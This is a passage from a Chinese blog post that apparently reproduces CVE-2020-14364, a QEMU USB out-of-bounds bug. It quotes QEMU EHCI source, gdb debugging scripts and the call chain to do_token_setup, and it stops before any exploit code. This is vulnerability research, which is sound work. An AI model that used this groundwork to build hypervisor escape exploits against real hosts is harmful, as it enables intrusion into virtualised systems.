TypeImpl *ti = type_get_by_name(typename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object_new_with_type(ti);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> Object *<span class="title function_">object_new_with_type</span><span class="params">(Type type)</span></span><br><span class="line">&#123;</span><br><span class="line">    Object *obj;</span><br><span class="line"></span><br><span class="line">    g_assert(type != <span class="literal">NULL</span>);</span><br><span class="line">    type_initialize(type);</span><br><span class="line"></span><br><span class="line">    obj = g_malloc(type-&gt;instance_size);</span><br><span class="line">    object_initialize_with_type(obj, type-&gt;instance_size, type);</span><br><span class="line">    obj-&gt;<span class="built_in">free</span> = g_free;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_initialize_with_type</span><span class="params">(<span class="type">void</span> *data, <span class="type">size_t</span> size, TypeImpl *type)</span></span><br><span class="line">&#123;</span><br><span class="line">    Object *obj = data;</span><br><span class="line"></span><br><span class="line">    type_initialize(type);</span><br><span class="line"></span><br><span class="line">    g_assert(type-&gt;instance_size &gt;= <span class="keyword">sizeof</span>(Object));</span><br><span class="line">    g_assert(type-&gt;abstract == <span class="literal">false</span>);</span><br><span class="line">    g_assert(size &gt;= type-&gt;instance_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(obj, <span class="number">0</span>, type-&gt;instance_size);</span><br><span class="line">    obj-&gt;<span class="class"><span class="keyword">class</span> =</span> type-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    object_ref(obj);</span><br><span class="line">    obj-&gt;properties = g_hash_table_new_full(g_str_hash, g_str_equal,</span><br><span class="line">                                            <span class="literal">NULL</span>, object_property_free);</span><br><span class="line">    object_init_with_type(obj, type);</span><br><span class="line">    object_post_init_with_type(obj, type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_init_with_type</span><span class="params">(Object *obj, TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type_has_parent(ti)) &#123;</span><br><span class="line">        object_init_with_type(obj, type_get_parent(ti));<span class="comment">// 递归初始化父Object</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;instance_init) &#123;<span class="comment">// 调用对应的初始化函数</span></span><br><span class="line">        ti-&gt;instance_init(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码逻辑中我们可以看到，函数首先从全局<code>Hash</code>表中得到<code>TypeImpl</code>结构体，然后在函数<code>object_new_with_type</code>中根据<code>type-&gt;instance_size</code>分配堆块的大小，该大小就是<code>DeciceState</code>结构体的大小。堆块分配完毕之后在<code>object_initialize_with_type--&gt;object_init_with_type</code>函数递归的初始化父<code>Object</code>，并调用对应的初始化函数。至此一个<code>device</code>的实例创建完成。</p>
<h2 id="usb设备读写函数"><a href="#usb设备读写函数" class="headerlink" title="usb设备读写函数"></a>usb设备读写函数</h2><p>首先我们看一下所有的设备，可以发现有两个是<code>usb control</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01) (prog-if 0)</span><br><span class="line">        Subsystem: Red Hat, Inc QEMU Virtual Machine</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 11</span><br><span class="line">        I/O ports at c040 [size=32]</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: uhci_hcd</span><br><span class="line">00:04.0 USB controller: Intel Corporation 82801I (ICH9 Family) USB2 EHCI Controller <span class="comment">#1 (rev 03) (p)</span></span><br><span class="line">        Subsystem: Red Hat, Inc QEMU Virtual Machine</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">        Memory at febb1000 (32-bit, non-prefetchable) [size=4K]</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: ehci-pci</span><br></pre></td></tr></table></figure>

<p>从启动脚本中对于<code>usb</code>设备的挂在来看<code>(ehci)</code>，这里<code>00:04.0</code>是我们创建的<code>usb</code>设备。这里首先看一下<a target="_blank" rel="noopener external nofollow noreferrer" href="https://qkxu.github.io/2020/01/05/USB%E8%AE%BE%E5%A4%87%E7%9B%B4%E9%80%9A.html"><code>usb</code>的控制器类型</a></p>
<ul>
<li>OHCI（Open Host Controller Interface）是支持USB1.1的标准，但它不仅仅是针对USB，还支持其他的一些接口，比如它还支持Apple的火线（Firewire，IEEE 1394）接口。与UHCI相比，OHCI的硬件复杂，硬件做的事情更多，所以实现对应的软件驱动的任务，就相对较简单。主要用于非x86的USB，如扩展卡、嵌入式开发板的USB主控。</li>
<li>UHCI（Universal Host Controller Interface），是Intel主导的对USB1.0、1.1的接口标准，与OHCI不兼容。UHCI的软件驱动的任务重，需要做得比较复杂，但可以使用较便宜、较简单的硬件的USB控制器。Intel和VIA使用UHCI，而其余的硬件提供商使用OHCI。</li>
<li>EHCI（Enhanced Host Controller Interface），是Intel主导的USB2.0的接口标准。EHCI仅提供USB2.0的高速功能，而依靠UHCI或OHCI来提供对全速（full-speed）或低速（low-speed）设备的支持。</li>
<li>xHCI（eXtensible Host Controller Interface），是最新最火的USB3.0的接口标准，它在速度、节能、虚拟化等方面都比前面3中有了较大的提高。xHCI支持所有种类速度的USB设备（USB 3.0 SuperSpeed, USB 2.0 Low-, Full-, and High-speed, USB 1.1 Low- and Full-speed）。xHCI的目的是为了替换前面3中（UHCI/OHCI/EHCI）。</li>
</ul>
<p>这里启动脚本中选择的是<code>EHCI</code>，因此这里的初始化函数为<code>usb_ehci_pci_init</code>（这里的函数通过直接搜索<code>usb</code>函数得到）。同时这里我们对该函数下断点<code>gdb qemu-system-x86_64</code>，其中<code>gdb_dbg</code>如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file qemu-system-x86_64 0x555555554000</span><br><span class="line"><span class="built_in">set</span> args -m 1G -nographic -hda ./rootfs.img -kernel ./bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda</span></span><br><span class="line"><span class="string"> rw&quot;</span> -device e1000,netdev=net0 -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 -usb -drive <span class="keyword">if</span>=none,form</span><br><span class="line">at=raw,<span class="built_in">id</span>=disk1,file=./usb.img -device ich9-usb-ehci1,<span class="built_in">id</span>=usb -device usb-storage,drive=disk1</span><br><span class="line">b usb_ehci_pci_init</span><br></pre></td></tr></table></figure>

<p>此时的系统调用栈如下</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210303100505159.png" alt="图片无法显示，请联系作者" title=" ">

<p>这里我们可以看到<code>object_new</code>函数中初始化了我们指定的<code>usb bus：ich9-usb-ehci1</code>。此时也可以得到<code>usb-ehci</code>的初始化函数为<code>usb_ehci_pci_init</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hw/usb/hcd-ehci-pci.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">usb_ehci_pci_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);</span><br><span class="line">    EHCIPCIState *i = PCI_EHCI(obj);</span><br><span class="line">    EHCIState *s = &amp;i-&gt;ehci;</span><br><span class="line"></span><br><span class="line">    s-&gt;caps[<span class="number">0x09</span>] = <span class="number">0x68</span>;        <span class="comment">/* EECP */</span></span><br><span class="line"></span><br><span class="line">    s-&gt;capsbase = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;opregbase = <span class="number">0x20</span>;</span><br><span class="line">    s-&gt;portscbase = <span class="number">0x44</span>;</span><br><span class="line">    s-&gt;portnr = NB_PORTS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dc-&gt;hotpluggable) &#123;</span><br><span class="line">        s-&gt;companion_enable = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_ehci_init(s, DEVICE(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这里将<code>opreg</code>的基地址<code>opregbase</code>设置为<code>0x20</code>，对这块内存读写即对<code>oprg</code>的内容进行读写。<code>opreg</code>的内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>)];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> usbcmd;</span><br><span class="line">    <span class="type">uint32_t</span> usbsts;</span><br><span class="line">    <span class="type">uint32_t</span> usbintr;</span><br><span class="line">    <span class="type">uint32_t</span> frindex;</span><br><span class="line">    <span class="type">uint32_t</span> ctrldssegment;</span><br><span class="line">    <span class="type">uint32_t</span> periodiclistbase;</span><br><span class="line">    <span class="type">uint32_t</span> asynclistaddr;</span><br><span class="line">    <span class="type">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">    <span class="type">uint32_t</span> configflag;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>实际上操作内存的函数总共有三种<code>ehci_caps_read/write, echi_opreg_read/write, echi_port_read/write</code>三种，这三个函数访问的是同一个内存，但是访问的基地址和范围是不一样的。<code>caps</code>的基地址定义在<code>capsbase</code>，对应的<code>port</code>的基地址则定义在<code>portscbase</code>。</p>
<p>函数设置完相应的成员变量之后就会调用<code>usb_echi_init</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_ehci_init</span><span class="params">(EHCIState *s, DeviceState *dev)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 2.2 host controller interface version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x00</span>] = (<span class="type">uint8_t</span>)(s-&gt;opregbase - s-&gt;capsbase);</span><br><span class="line">    s-&gt;caps[<span class="number">0x01</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x02</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x03</span>] = <span class="number">0x01</span>;        <span class="comment">/* HC version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x04</span>] = s-&gt;portnr;   <span class="comment">/* Number of downstream ports */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x05</span>] = <span class="number">0x00</span>;        <span class="comment">/* No companion ports at present */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x06</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x07</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x08</span>] = <span class="number">0x80</span>;        <span class="comment">/* We can cache whole frame, no 64-bit */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x0a</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x0b</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;aqueues);</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;pqueues);</span><br><span class="line">    usb_packet_init(&amp;s-&gt;ipacket);</span><br><span class="line"></span><br><span class="line">    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="string">&quot;ehci&quot;</span>, MMIO_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,</span><br><span class="line">                          <span class="string">&quot;capabilities&quot;</span>, CAPA_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,</span><br><span class="line">                          <span class="string">&quot;operational&quot;</span>, s-&gt;portscbase);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,</span><br><span class="line">                          <span class="string">&quot;ports&quot;</span>, <span class="number">4</span> * s-&gt;portnr);</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,</span><br><span class="line">                                &amp;s-&gt;mem_ports);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数设置完相应的成员变量之后就注册了<code>caps,opreg,port</code>的读写函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_caps_ops = &#123;</span><br><span class="line">    .read = ehci_caps_read,</span><br><span class="line">    .write = ehci_caps_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .impl.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .impl.max_access_size = <span class="number">1</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;</span><br><span class="line">    .read = ehci_opreg_read,</span><br><span class="line">    .write = ehci_opreg_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;</span><br><span class="line">    .read = ehci_port_read,</span><br><span class="line">    .write = ehci_port_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里我们看一下<code>opreg</code>的读写函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">ehci_opreg_read</span><span class="params">(<span class="type">void</span> *ptr, hwaddr addr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="type">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        <span class="comment">/* Round down to mult of 8, else it can go backwards on migration */</span></span><br><span class="line">        val = s-&gt;frindex &amp; ~<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        val = s-&gt;opreg[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_read(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的是三个参数，第一个参数是<code>EHCIState</code>结构体指针，第二个参数是<code>addr</code>即偏移，当执行语句<code>\*((uint64_t\*)(mmio_mem + 0x20))</code>的时候这里实际上传入的<code>addr</code>是<code>0</code>，因为之前设置的<code>opregbase=0x20</code>。第三个参数就是<code>size</code>，不过这里并没有使用到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_opreg_write</span><span class="params">(<span class="type">void</span> *ptr, hwaddr addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="type">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="type">uint32_t</span> old = *mmio;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> USBCMD:</span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_HCRESET) &#123;</span><br><span class="line">            ehci_reset(s);</span><br><span class="line">            val = s-&gt;usbcmd;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* not supporting dynamic frame list size at the moment */</span></span><br><span class="line">        <span class="keyword">if</span> ((val &amp; USBCMD_FLS) &amp;&amp; !(s-&gt;usbcmd &amp; USBCMD_FLS)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;attempt to set frame list size -- value %d\n&quot;</span>,</span><br><span class="line">                    (<span class="type">int</span>)val &amp; USBCMD_FLS);</span><br><span class="line">            val &amp;= ~USBCMD_FLS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_IAAD) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Process IAAD immediately, otherwise the Linux IAAD watchdog may</span></span><br><span class="line"><span class="comment">             * trigger and re-use a qh without us seeing the unlink.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">            trace_usb_ehci_doorbell_ring();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=</span><br><span class="line">            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;</span><br><span class="line">                SET_LAST_RUN_CLOCK(s);</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;usbcmd = val; <span class="comment">/* Set usbcmd for ehci_update_halt() */</span></span><br><span class="line">            ehci_update_halt(s);</span><br><span class="line">            s-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBSTS:</span><br><span class="line">        val &amp;= USBSTS_RO_MASK;              <span class="comment">// bits 6 through 31 are RO</span></span><br><span class="line">        ehci_clear_usbsts(s, val);          <span class="comment">// bits 0 through 5 are R/WC</span></span><br><span class="line">        val = s-&gt;usbsts;</span><br><span class="line">        ehci_update_irq(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> USBINTR:</span><br><span class="line">        val &amp;= USBINTR_MASK;</span><br><span class="line">        <span class="keyword">if</span> (ehci_enabled(s) &amp;&amp; (USBSTS_FLR &amp; val)) &#123;</span><br><span class="line">            qemu_bh_schedule(s-&gt;async_bh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        val &amp;= <span class="number">0x00003fff</span>; <span class="comment">/* frindex is 14bits */</span></span><br><span class="line">        s-&gt;usbsts_frindex = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CONFIGFLAG:</span><br><span class="line">        val &amp;= <span class="number">0x1</span>;</span><br><span class="line">        <span class="keyword">if</span> (val) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NB_PORTS; i++)</span><br><span class="line">                handle_port_owner_write(s, i, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PERIODICLISTBASE:</span><br><span class="line">        <span class="keyword">if</span> (ehci_periodic_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">&quot;ehci: PERIODIC list base register set while periodic schedule\n&quot;</span></span><br><span class="line">              <span class="string">&quot;      is enabled and HC is enabled\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ASYNCLISTADDR:</span><br><span class="line">        <span class="keyword">if</span> (ehci_async_enabled(s)) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">              <span class="string">&quot;ehci: ASYNC list address register set while async schedule\n&quot;</span></span><br><span class="line">              <span class="string">&quot;      is enabled and HC is enabled\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *mmio = val;</span><br><span class="line">    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),</span><br><span class="line">                                *mmio, old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>在<code>qemu</code>启动的时候对<code>do_token_setup</code>下断点，<code>gdb_dbg</code>如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file qemu-system-x86_64 0x555555554000</span><br><span class="line"><span class="built_in">set</span> args -m 1G -nographic -hda ./rootfs.img -kernel ./bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> -device e1000,netdev=net0 -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 -usb -drive <span class="keyword">if</span>=none,forma1</span><br><span class="line">b do_token_setup</span><br></pre></td></tr></table></figure>

<p>我们可以看到如下的函数调用链</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210312213834240.png" alt="图片无法显示，请联系作者" title=" ">

<p>也就是如下的函数调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">do_token_setup</span><br><span class="line">usb_process_one</span><br><span class="line">usb_handle_packet</span><br><span class="line">ehci_execute</span><br><span class="line">ehci_state_execute</span><br><span class="line">ehci_advance_state</span><br><span class="line">ehci_advance_async_state</span><br><span class="line">ehci_work_bh</span><br></pre></td></tr></table></figure>

<p>但是这里存在一个问题就是当我们对<code>ehci_advance_async_state</code>函数下了断点之后，其会多次断在这个函数上，因此我们选择另一个函数调用链，对<code>ehci_advance_state</code>函数进行交叉引用，我们发现<code>ehci_advance_periodic_state</code>函数也会调用<code>ehci_advance_state</code>函数，因此选择的函数调用链如下</p>
<p><code>ehci_work_bh-&gt;ehci_advance_periodic_state-&gt;ehci_advance_state-&gt;ehci_state_execute-&gt;ehci_execute-&gt;usb_handle_packet-&gt;usb_process_one-&gt;do_token_setup</code></p>
